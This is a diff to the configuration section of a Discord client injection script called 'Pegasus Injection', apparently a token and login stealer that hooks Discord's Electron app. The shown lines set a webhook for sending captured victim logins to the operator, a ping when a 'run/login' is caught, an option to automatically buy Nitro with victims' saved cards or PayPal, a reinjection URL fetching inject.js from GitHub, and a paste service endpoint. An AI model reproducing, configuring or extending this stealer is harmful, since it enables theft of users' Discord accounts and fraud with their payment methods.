@@ -5,15 +5,15 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 
 const config = {
-    auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-    ping_on_run: true, //pings @everyone when you get a run/login
-    ping_val: '@here', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+    auto_buy_nitro: false,
+    ping_on_run: true, 
+    ping_val: '@here', 
     embed_name: 'Pegasus Injection', //name of the webhook thats gonna send the info
-    embed_icon: 'https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-    embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-    webhook: '%WEBHOOK%', //your discord webhook there obviously
-    injection_url: 'https://github.com/addi00000/pegasus/blob/main/inject.js', //injection url for when it reinjects
-    /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
+    embed_icon: 'https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg'.replace(/ /g,'%20'), 
+    embed_color: 14423100, 
+    webhook: '%WEBHOOK%',
+    injection_url: 'https://github.com/addi00000/pegasus/blob/main/inject.js',
+    
     api: 'https://discord.com/api/v9/users/@me',
     bin: 'https://dpaste.com/api/',
     nitro: {
